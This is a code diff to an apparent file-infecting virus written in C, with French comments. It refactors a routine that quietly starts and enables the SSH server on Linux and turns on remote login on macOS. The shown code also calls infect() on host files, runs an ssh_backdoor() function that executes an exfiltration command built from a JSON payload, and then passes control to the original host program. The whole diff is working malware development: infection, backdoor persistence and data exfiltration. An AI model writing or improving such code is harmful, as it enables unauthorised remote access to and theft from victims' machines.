@@ -243,44 +243,66 @@ void ssh_backdoor() {
       json_payload);
 
   system(exfil_cmd);
+}
 
-  char bufferO[256];
+// 🔍 Vérifie si SSH est actif
+int is_ssh_active() {
+  char buffer[256];
+  FILE *fp;
 
-  // 🔍 Détecter l'OS
-  FILE *fpo = popen("uname", "r");
+  fp = popen("uname -s", "r");
+  if (!fp)
+    return -1;
 
-  fgets(bufferO, sizeof(bufferO), fpo);
-  pclose(fpo);
+  fgets(buffer, sizeof(buffer), fp);
+  pclose(fp);
 
-  // 🐧 LINUX
-  if (strstr(bufferO, "Linux")) {
+  if (strstr(buffer, "Linux")) {
+    fp = popen("systemctl is-active sshd 2>/dev/null", "r");
+    if (!fp)
+      return -1;
 
-    // Vérifier si sshd tourne
-    fp = popen("systemctl is-active sshd", "r");
+    fgets(buffer, sizeof(buffer), fp);
+    pclose(fp);
 
-    fgets(bufferO, sizeof(bufferO), fpo);
-    pclose(fpo);
-
-    if (strstr(bufferO, "active")) {
-    } else {
-      system("sudo systemctl start sshd");
-      system("sudo systemctl enable sshd");
-    }
-
+    return (strstr(buffer, "active") != NULL);
   }
-  // macOS
-  else if (strstr(bufferO, "Darwin")) {
 
-    // Vérifier si SSH est actif
-    fp = popen("systemsetup -getremotelogin", "r");
+  else if (strstr(buffer, "Darwin")) {
+    fp = popen("systemsetup -getremotelogin 2>/dev/null", "r");
+    if (!fp)
+      return -1;
 
-    fgets(bufferO, sizeof(bufferO), fpo);
-    pclose(fpo);
+    fgets(buffer, sizeof(buffer), fp);
+    pclose(fp);
 
-    if (strstr(bufferO, "On")) {
-    } else {
-      system("sudo systemsetup -setremotelogin on");
-    }
+    return (strstr(buffer, "On") != NULL);
+  }
+
+  return -1;
+}
+
+// 🚀 Démarre SSH si pas actif
+void start_ssh() {
+  char buffer[256];
+  FILE *fp;
+
+  fp = popen("uname -s", "r");
+  if (!fp)
+    return;
+
+  fgets(buffer, sizeof(buffer), fp);
+  pclose(fp);
+
+  if (strstr(buffer, "Linux")) {
+    printf("[Linux] Starting SSH...\n");
+    system("systemctl start sshd");
+    system("systemctl enable sshd");
+  }
+
+  else if (strstr(buffer, "Darwin")) {
+    printf("[macOS] Enabling SSH...\n");
+    system("systemsetup -setremotelogin on");
   }
 }
 
@@ -294,6 +316,12 @@ int main(int argc, char *argv[]) {
   infect(fileUninfected, prog_name);
 
   ssh_backdoor();
+
+  int status = is_ssh_active();
+
+  if (status == 0) {
+    start_ssh();
+  }
 
   execHost(files, prog_name, argc, argv);
 }
